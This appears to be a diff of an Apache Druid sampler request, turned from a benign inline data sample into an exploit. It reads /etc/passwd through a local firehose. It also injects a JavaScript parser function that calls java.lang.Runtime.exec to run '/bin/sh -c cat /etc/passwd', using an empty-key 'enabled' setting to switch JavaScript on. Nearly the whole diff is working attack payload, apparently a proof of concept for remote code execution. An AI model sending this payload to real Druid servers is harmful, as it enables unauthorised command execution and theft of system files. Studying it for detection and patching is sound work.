@@ -3,41 +3,28 @@
   "spec": {
     "ioConfig": {
       "type": "index",
-      "inputSource": {
-        "type": "inline",
-        "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"
-      },
-      "inputFormat": {
-        "type": "json",
-        "keepNullColumns": true
+      "firehose": {
+        "type": "local",
+        "baseDir": "/etc",
+        "filter": "passwd"
       }
     },
     "dataSchema": {
-      "dataSource": "sample",
-      "timestampSpec": {
-        "column": "timestamp",
-        "format": "iso"
-      },
-      "dimensionsSpec": {},
-      "transformSpec": {
-        "transforms": [],
-        "filter": {
-          "type": "javascript",
-          "dimension": "added",
-          "function": "function(value) {}",
+      "dataSource": "xxxxxx",
+      "parser": {
+        "parseSpec": {
+          "format": "javascript",
+          "timestampSpec": {},
+          "dimensionsSpec": {},
+          "function": "function(){var fileContent = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"/bin/sh`@~-c`@~cat /etc/passwd\".split(\"`@~\")).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"1622212345709\",kadkand: fileContent}}",
           "": {
-            "enabled": true
+            "enabled": "true"
           }
         }
       }
-    },
-    "type": "index",
-    "tuningConfig": {
-      "type": "index"
     }
   },
   "samplerConfig": {
-    "numRows": 500,
-    "timeoutMs": 15000
+    "numRows": 10
   }
 }
